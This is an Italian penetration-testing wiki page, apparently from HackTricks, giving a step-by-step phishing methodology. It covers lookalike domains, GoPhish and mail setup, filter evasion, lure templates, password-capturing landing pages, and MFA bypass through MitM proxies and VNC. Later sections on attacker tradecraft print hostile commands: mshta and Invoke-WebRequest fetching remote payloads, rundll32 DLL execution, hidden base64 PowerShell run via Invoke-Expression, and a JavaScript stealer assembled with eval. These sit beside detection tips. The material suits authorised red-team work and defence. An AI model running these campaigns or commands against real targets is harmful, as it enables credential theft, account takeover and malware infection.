# Metodologia di phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Esamina la vittima
   1. Seleziona il **dominio della vittima**.
   2. Esegui una semplice enumerazione web **cercando i portali di login** usati dalla vittima e **decidi** quale **impersonare**.
   3. Usa tecniche di **OSINT** per **trovare gli indirizzi email**.
2. Prepara l'ambiente
   1. **Acquista il dominio** da usare per il phishing assessment
   2. **Configura i record** relativi al servizio email (SPF, DMARC, DKIM, rDNS)
   3. Configura il VPS con **gophish**
3. Prepara la campagna
   1. Prepara il **modello email**
   2. Prepara la **pagina web** per rubare le credenziali
4. Avvia la campagna!

## Genera nomi di dominio simili o acquista un dominio affidabile

### Tecniche di variazione dei nomi di dominio

- **Keyword**: il nome di dominio **contiene** una **parola chiave** importante del dominio originale (ad es., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: sostituisci il **punto con un trattino** in un sottodominio (ad es., www-zelster.com).
- **New TLD**: stesso dominio con un **nuovo TLD** (ad es., zelster.org)
- **Homoglyph**: **sostituisce** una lettera del nome di dominio con **lettere dall'aspetto simile** (ad es., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **scambia due lettere** all'interno del nome di dominio (ad es., zelsetr.com).
- **Singularization/Pluralization**: aggiunge o rimuove una “s” alla fine del nome di dominio (ad es., zeltsers.com).
- **Omission**: **rimuove una** delle lettere dal nome di dominio (ad es., zelser.com).
- **Repetition:** **ripete una** delle lettere nel nome di dominio (ad es., zeltsser.com).
- **Replacement**: come Homoglyph, ma meno furtiva. Sostituisce una delle lettere del nome di dominio, magari con una lettera vicina a quella originale sulla tastiera (ad es., zektser.com).
- **Subdomained**: inserisce un **punto** all'interno del nome di dominio (ad es., ze.lster.com).
- **Insertion**: **inserisce una lettera** nel nome di dominio (ad es., zerltser.com).
- **Missing dot**: aggiunge il TLD al nome di dominio (ad es., zelstercom.com)

**Strumenti automatici**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Siti web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

È **possibile che alcuni bit memorizzati o in comunicazione vengano invertiti automaticamente** a causa di vari fattori, come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non corrisponda a quello richiesto inizialmente.

Ad esempio, una modifica di un singolo bit nel dominio "windows.com" può trasformarlo in "windnws.com".

Gli aggressori possono **approfittarne registrando più domini ottenuti tramite bitflipping** simili a quello della vittima. Il loro obiettivo è reindirizzare gli utenti legittimi verso la propria infrastruttura.

Per ulteriori informazioni, leggi [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acquista un dominio affidabile

Puoi cercare un dominio scaduto da usare su [https://www.expireddomains.net/](https://www.expireddomains.net).\
Per assicurarti che il dominio scaduto che intendi acquistare **abbia già una buona SEO**, puoi verificare come è classificato su:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Scoprire indirizzi email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **trovare altri** indirizzi email validi o **verificare quelli** già individuati, puoi controllare se riesci a eseguire un brute force sui server SMTP della vittima. [Scopri qui come verificare/trovare indirizzi email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che se gli utenti usano **un portale web per accedere alle proprie email**, puoi verificare se è vulnerabile al **brute force degli username** e, se possibile, sfruttare la vulnerabilità.

## Configurare GoPhish

### Installazione

Puoi scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricalo ed estrailo in `/opt/gophish`, quindi esegui `/opt/gophish/gophish`\
Nell'output verrà mostrata la password dell'utente admin sulla porta 3333. Accedi quindi a quella porta e usa le credenziali per cambiare la password admin. Potrebbe essere necessario inoltrare quella porta in locale:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio, dovresti **aver già acquistato il dominio** che intendi usare, che deve **puntare** all’**IP del VPS** su cui stai configurando **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Configurazione della posta**

Inizia installando: `apt-get install postfix`

Poi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica anche i valori delle seguenti variabili in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** inserendo il nome del tuo dominio e **riavvia il tuo VPS.**

Ora crea un **record DNS A** per `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **record DNS MX** che punti a `mail.<domain>`

Ora proviamo a inviare un'email:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Configurazione di Gophish**

Interrompi l’esecuzione di gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l’uso di https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Configura il servizio gophish**

Per creare il servizio gophish, in modo che possa essere avviato automaticamente e gestito come servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Completa la configurazione del servizio e verifica che funzioni eseguendo:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Configurare il server di posta e il dominio

### Aspetta e sii legittimo

Più vecchio è un dominio, meno è probabile che venga identificato come spam. Dovresti quindi aspettare il più possibile (almeno 1 settimana) prima della valutazione di phishing. Inoltre, se inserisci una pagina relativa a un settore con una buona reputazione, la reputazione ottenuta sarà migliore.

Tieni presente che, anche se devi aspettare una settimana, puoi completare subito tutta la configurazione.

### Configurare il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Record Sender Policy Framework (SPF)

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cos'è un record SPF, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP del VPS)

![Modulo SPF Wizard per generare un record SPF per un dominio di phishing](<../../images/image (1037).png>)

Questo è il contenuto da impostare in un record TXT del dominio:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Record Domain-based Message Authentication, Reporting & Conformance (DMARC)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DKIM, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial si basa su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Devi concatenare entrambi i valori B64 generati dalla chiave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Verifica il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Ti basta accedere alla pagina e inviare un'email all'indirizzo che ti forniscono:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Puoi anche **controllare la configurazione della tua email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per farlo dovrai **aprire** la porta **25** e controllare la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Potresti anche inviare un **messaggio a un account Gmail sotto il tuo controllo** e controllare le **intestazioni dell’email** nella posta in arrivo di Gmail: `dkim=pass` dovrebbe essere presente nel campo dell’intestazione `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Rimozione dalla blacklist di Spamhouse

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio è bloccato da Spamhouse. Puoi richiedere la rimozione del tuo dominio/IP da: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla blacklist di Microsoft

​​Puoi richiedere la rimozione del tuo dominio/IP da [https://sender.office.com/](https://sender.office.com).

## Creare e avviare una campagna GoPhish

### Profilo di invio

- Imposta un **nome identificativo** per il profilo del mittente
- Decidi da quale account inviare le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti i campi del nome utente e della password, ma assicurati di selezionare Ignora errori del certificato

![Creare e avviare una campagna GoPhish - Profilo di invio: puoi lasciare vuoti i campi del nome utente e della password, ma assicurati di selezionare Ignora errori del certificato](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Si consiglia di usare la funzionalità "**Invia email di test**" per verificare che tutto funzioni.\
> Consiglierei di **inviare le email di test a indirizzi email temporanei di 10 minuti**, per evitare di finire in blacklist durante i test.

### Modello email

- Imposta un **nome identificativo** per il modello
- Poi scrivi un **oggetto** (niente di strano: solo qualcosa che ti aspetteresti di leggere in una normale email)
- Assicurati di aver selezionato "**Aggiungi immagine di tracciamento**"
- Scrivi il **modello email** (puoi usare variabili come nell'esempio seguente):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Nota: **per aumentare la credibilità dell'email**, è consigliabile usare una firma presa da un'email del cliente. Ecco alcuni suggerimenti:

- Invia un'email a un **indirizzo inesistente** e controlla se la risposta contiene una firma.
- Cerca **indirizzi email pubblici** come info@ex.com, press@ex.com o public@ex.com, invia loro un'email e attendi la risposta.
- Prova a contattare un **indirizzo email valido individuato** e attendi la risposta.

![Profilo di invio - Modello email: prova a contattare un indirizzo email valido individuato e attendi la risposta](<../../images/image (80).png>)

> [!TIP]
> Il modello email consente anche di **allegare file da inviare**. Se vuoi anche sottrarre challenge NTLM usando file o documenti appositamente creati, [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Pagina di destinazione

- Inserisci un **nome**
- **Scrivi il codice HTML** della pagina web. Puoi anche **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **reindirizzamento**

![Modello email - Pagina di destinazione: seleziona Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina ed eseguire alcuni test in locale (magari usando un server Apache) **finché il risultato non ti soddisfa.** Poi, inserisci quel codice HTML nella casella.\
> Se devi **usare risorse statiche** nell'HTML (magari alcune pagine CSS e JS), puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il reindirizzamento, puoi **indirizzare gli utenti alla pagina principale legittima** della vittima oppure, per esempio, reindirizzarli a _/static/migration.html_, mostrare una **ruota di caricamento (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è riuscito**.

### Utenti e gruppi

- Imposta un nome
- **Importa i dati** (nota che, per usare il template dell'esempio, devi disporre di nome, cognome e indirizzo email di ogni utente)

![Pagina di destinazione - Utenti e gruppi: importa i dati (nota che, per usare il template dell'esempio, devi disporre di nome, cognome e indirizzo email di ogni utente)](<../../images/image (163).png>)

### Campagna

Infine, crea una campagna scegliendo un nome, il modello email, la pagina di destinazione, l'URL, il profilo di invio e il gruppo. Nota che l'URL sarà il link inviato alle vittime.

Il **profilo di invio consente di inviare un'email di prova per vedere come apparirà l'email di phishing finale**:

![Utenti e gruppi - Campagna: il profilo di invio consente di inviare un'email di prova per vedere come apparirà l'email di phishing finale](<../../images/image (192).png>)

Quando è tutto pronto, avvia la campagna!

## Clonazione di un sito web

Se per qualsiasi motivo vuoi clonare il sito web, consulta la seguente pagina:


{{#ref}}
clone-a-website.md
{{#endref}}

## Documenti e file backdoored

In alcune valutazioni di phishing (soprattutto per i Red Team) potresti voler anche **inviare file contenenti una backdoor** (magari un C2 o semplicemente qualcosa che attivi un'autenticazione).\
Consulta la seguente pagina per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Tramite proxy MitM

L'attacco precedente è piuttosto ingegnoso: simuli un sito web reale e raccogli le informazioni inserite dall'utente. Purtroppo, se l'utente non inserisce la password corretta o se l'applicazione che hai simulato è configurata con 2FA, **queste informazioni non ti consentiranno di impersonare l'utente ingannato**.

È qui che strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) tornano utili. Questi strumenti consentono di realizzare un attacco di tipo MitM. In pratica, l'attacco funziona così:

1. **Impersoni il modulo di login** della pagina web reale.
2. L'utente **invia** le proprie **credenziali** alla tua pagina falsa e lo strumento le invia alla pagina web reale, **verificando se sono valide**.
3. Se l'account è configurato con **2FA**, la pagina MitM la richiederà e, quando l'**utente la inserisce**, lo strumento la invierà alla pagina web reale.
4. Una volta autenticato l'utente, tu (in qualità di attaccante) avrai **acquisito le credenziali, la 2FA, il cookie e tutte le informazioni** relative alle interazioni effettuate mentre lo strumento esegue un MitM.

### Tramite VNC

E se invece di **indirizzare la vittima a una pagina malevola** che assomiglia a quella originale, la indirizzassi a una **sessione VNC con un browser connesso alla pagina web reale**? Potresti vedere cosa fa, rubare la password, l'MFA usata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Rilevare il rilevamento

Ovviamente, uno dei modi migliori per capire se sei stato scoperto è **cercare il tuo dominio nelle blacklist**. Se compare nell'elenco, significa che in qualche modo è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo dominio compare in una blacklist è usare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

ci sono altri modi per capire se la vittima **sta cercando attivamente attività di phishing sospette in rete**.

Puoi **acquistare un dominio con un nome molto simile** a quello del dominio della vittima **e/o generare un certificato** per un **sottodominio** di un dominio sotto il tuo controllo, **contenente** la **parola chiave** del dominio della vittima. Se la **vittima** effettua qualsiasi tipo di **interazione DNS o HTTP** con questi domini, saprai che **sta cercando attivamente** domini sospetti e dovrai agire con molta discrezione.<sup>[[2]](#references)</sup>

### Valutare il phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious)per valutare se la tua email finirà nella cartella spam, verrà bloccata o avrà successo.

## Compromissione dell'identità ad alto contatto (reset MFA tramite help desk)

I moderni gruppi di intrusione sempre più spesso ignorano del tutto le esche via email e **prendono direttamente di mira il flusso di lavoro del service desk/recupero dell'identità** per aggirare l'MFA. L'attacco è completamente basato su strumenti legittimi: una volta ottenute credenziali valide, l'operatore si sposta usando gli strumenti di amministrazione integrati: non serve malware.<sup>[[6]](#references)</sup>

### Flusso dell'attacco
1. Ricognizione della vittima 
   * Raccogli dettagli personali e aziendali da LinkedIn, violazioni di dati, GitHub pubblico, ecc.  
   * Individua le identità di alto valore (dirigenti, IT, finanza) e ricostruisci l'**esatta procedura dell'help desk** per il reset della password/MFA.
2. Social engineering in tempo reale  
   * Chiama, contatta su Teams o chatta con l'help desk fingendoti la vittima (spesso usando un **caller ID falsificato** o una **voce clonata**).  
   * Fornisci le informazioni personali raccolte in precedenza per superare la verifica basata sulla conoscenza.  
   * Convinci l'operatore a **reimpostare il secret MFA** o a eseguire un **SIM swap** sul numero di cellulare registrato.
3. Azioni immediate dopo l'accesso (≤60 min nei casi reali)  
   * Ottieni un punto d'appoggio tramite un qualsiasi portale web SSO.  
   * Enumera AD/AzureAD usando gli strumenti integrati (senza caricare binari):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement con **WMI**, **PsExec** o agent **RMM** legittimi già inseriti nella whitelist dell'ambiente.

### Rilevamento e mitigazione
* Tratta il recupero dell'identità tramite help desk come un'**operazione privilegiata**: richiedi step-up auth e l'approvazione di un manager.
* Implementa regole di **Identity Threat Detection & Response (ITDR)** / **UEBA** che generino avvisi per:  
  * Modifica del metodo MFA + autenticazione da un nuovo dispositivo / area geografica.  
  * Elevazione immediata dello stesso principal (utente-→-admin).
* Registra le chiamate all'help desk e imponi una **richiamata a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** affinché gli account appena reimpostati **non ereditino** automaticamente token con privilegi elevati.

---

## Inganno su larga scala – Avvelenamento SEO e campagne “ClickFix”
I gruppi criminali comuni compensano i costi delle operazioni mirate su larga scala con attacchi di massa che trasformano **motori di ricerca e reti pubblicitarie nel canale di distribuzione**.<sup>[[6]](#references)</sup>

1. L'**avvelenamento SEO / malvertising** spinge in cima agli annunci di ricerca un risultato falso, ad esempio `chromium-update[.]site`.
2. La vittima scarica un piccolo **loader di primo stadio** (spesso JS/HTA/ISO). Esempi rilevati da Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Il loader esfiltra cookie del browser e database delle credenziali, quindi scarica un **loader silenzioso** che decide – *in tempo reale* – se distribuire:
   * RAT (ad es. AsyncRAT, RustDesk)
   * ransomware / wiper
   * componente di persistenza (chiave Run del registro + attività pianificata)

### Suggerimenti per l'hardening
* Blocca i domini registrati di recente e applica **Advanced DNS / URL Filtering** agli *annunci di ricerca* oltre che alle e-mail.
* Limita l'installazione del software ai pacchetti MSI firmati / Store e impedisci l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora i processi figli dei browser che aprono programmi di installazione:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Cerca i LOLBins spesso abusati dai first-stage loader (ad es. `regsvr32`, `curl`, `mshta`).

### Hijacking del clic sul pulsante di download con passaggio a TDS
Alcuni portali di software contraffatti mantengono l’`href` visibile per il download puntato al **vero** URL di GitHub/release, ma dirottano la **prima** interazione dell’utente tramite JavaScript e indirizzano la vittima verso una catena di **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Tratti principali:
- L’hook viene solitamente eseguito nella **fase di capture** (`true`) su `document`, quindi viene attivato prima degli handler del sito.
- Chrome usa spesso `mousedown` invece di `click` per mantenere il redirect associato a un **gesto valido dell’utente** e migliorare l’elusione dei popup blocker.
- Alcune varianti aprono prima `about:blank` o simulano clic su `<a target="_blank">`, assegnando l’URL del TDS solo in seguito.
- I limiti lato browser risiedono spesso in `localStorage`, quindi il **primo clic** può raggiungere il malware, mentre gli aggiornamenti della pagina o i nuovi tentativi rimandano al link visibile dall’aspetto innocuo.
- Il TDS può applicare filtri in base a referrer, dominio di ingresso, GEO, fingerprint del browser/dispositivo, controlli VPN/datacenter, contesto del clic e contatori per sessione, rendendo non deterministici i replay dell’analista.

Idee per i defender:
- Confrontare l’`href` **visualizzato** con la destinazione di navigazione **effettiva** generata al clic.
- Cercare handler `document.addEventListener(..., true)` che chiamano sia `preventDefault()` sia `stopImmediatePropagation()` insieme a `window.open`, `about:blank` o clic simulati su anchor.
- Considerare gli insiemi di domini di download software appena registrati che caricano tutti lo stesso stage CloudFront/JS come un pattern SEO poisoning/TDS ad alto segnale.

### ClickFix da pagine di verifica false + fetch di LOLBAS dall’aspetto di archivi
Alcuni rami del TDS terminano in una pagina di verifica falsa (in stile Cloudflare/IUAM) che invita la vittima a eseguire un binario Windows attendibile, come:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Note:
- `mshta.exe` esegue l'**HTA/VBScript all'inizio della risposta**, anche se l'URL finge di essere un archivio `.7z`; i dati dell'archivio aggiunti in coda possono essere un puro depistaggio.
- Le fasi successive spesso continuano a mentire sul tipo di file (`.rtf` per PowerShell, `.asar` per Python, ZIP con binari imbottiti) e poi passano al **mapping manuale di PE / esecuzione in memoria**.
- Se stai rispondendo a una di queste catene, conserva **rete + memoria dal primo avvio riuscito**: i replay successivi potrebbero mostrare solo un percorso benigno di installer/SFX o fallire perché il rilascio del payload/della chiave era vincolato alla sessione TDS originale.

### Tecnica di distribuzione di DLL ClickFix (falso aggiornamento CERT)
* Esca: avviso CERT nazionale clonato con un pulsante **Update** che mostra istruzioni dettagliate per la “correzione”. Alle vittime viene detto di eseguire uno script batch che scarica una DLL e la esegue tramite `rundll32`.<sup>[[12]](#references)</sup>
* Tipica catena batch osservata:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` salva il payload in `%TEMP%`, una breve attesa nasconde il jitter di rete, quindi `rundll32` chiama l’entrypoint esportato (`notepad`).
* La DLL invia un beacon con l’identità dell’host e interroga il C2 ogni pochi minuti. I comandi remoti arrivano come **PowerShell codificato in base64**, eseguito in modalità nascosta e con il bypass dei criteri:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Questo preserva la flessibilità del C2 (il server può sostituire i task senza aggiornare la DLL) e nasconde le finestre della console. Cerca processi PowerShell figli di `rundll32.exe` che usano insieme `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* I difensori possono cercare callback HTTP(S) del tipo `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## Operazioni di phishing potenziate dall'IA
Gli attaccanti ora concatenano **API LLM e di clonazione vocale** per creare esche completamente personalizzate e interagire in tempo reale.

| Livello | Esempio di utilizzo da parte dell'attore della minaccia |
|-------|-----------------------------|
|Automazione|Generare e inviare oltre 100 mila email/SMS con formulazioni randomizzate e link di tracking.|
|IA generativa|Creare email *uniche* che citano operazioni pubbliche di M&A e battute interne tratte dai social media; usare la voce deepfake del CEO in una truffa con richiamata.|
|IA agentica|Registrare domini autonomamente, raccogliere informazioni di intelligence open source e creare email per la fase successiva quando una vittima fa clic ma non invia le credenziali.|

**Difesa:**  
• Aggiungere **banner dinamici** che evidenziano i messaggi inviati tramite automazioni non attendibili (in base ad anomalie ARC/DKIM).  
• Implementare **frasi di verifica biometriche vocali** per le richieste telefoniche ad alto rischio.  
• Simulare continuamente esche generate dall'IA nei programmi di sensibilizzazione: i template statici sono obsoleti.

Vedi anche: abuso della navigazione agentica per il phishing delle credenziali:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Vedi anche: abuso degli strumenti CLI locali e MCP da parte di agenti IA (per l'inventario e il rilevamento dei segreti):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblaggio runtime di JavaScript di phishing assistito da LLM (generazione di codice nel browser)

Gli attaccanti possono distribuire HTML apparentemente innocuo e **generare lo stealer a runtime** chiedendo JavaScript a un'**API LLM attendibile**, per poi eseguirlo nel browser (ad es. con `eval` o un `<script>` dinamico).<sup>[[8]](#references)</sup>

1. **Prompt come offuscamento:** codificare gli URL di esfiltrazione/le stringhe Base64 nel prompt; iterare sulle formulazioni per aggirare i filtri di sicurezza e ridurre le allucinazioni.
2. **Chiamata API lato client:** al caricamento, JS chiama un LLM pubblico (Gemini/DeepSeek/ecc.) o un proxy CDN; nell'HTML statico sono presenti solo il prompt e la chiamata API.
3. **Assemblaggio ed esecuzione:** concatenare la risposta ed eseguirla (polimorfico a ogni visita):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** il codice generato personalizza l’esca (ad es., parsing dei token di LogoKit) e invia le credenziali all’endpoint nascosto nel prompt.

**Tratti di evasione**
- Il traffico raggiunge domini LLM noti o proxy CDN affidabili; a volte passa tramite WebSocket verso un backend.
- Nessun payload statico; il JS malevolo esiste solo dopo il rendering.
- Le generazioni non deterministiche producono stealer **unici** per sessione.

**Idee per il rilevamento**
- Eseguire sandbox con JS abilitato; segnalare `eval` a runtime o la creazione di script dinamici provenienti da risposte LLM.
- Cercare POST dal front-end verso API LLM, seguite immediatamente da `eval`/`Function` sul testo restituito.
- Generare un alert per domini LLM non autorizzati nel traffico client, seguiti da POST di credenziali.

---

## Variante MFA Fatigue / Push Bombing – Reset forzato
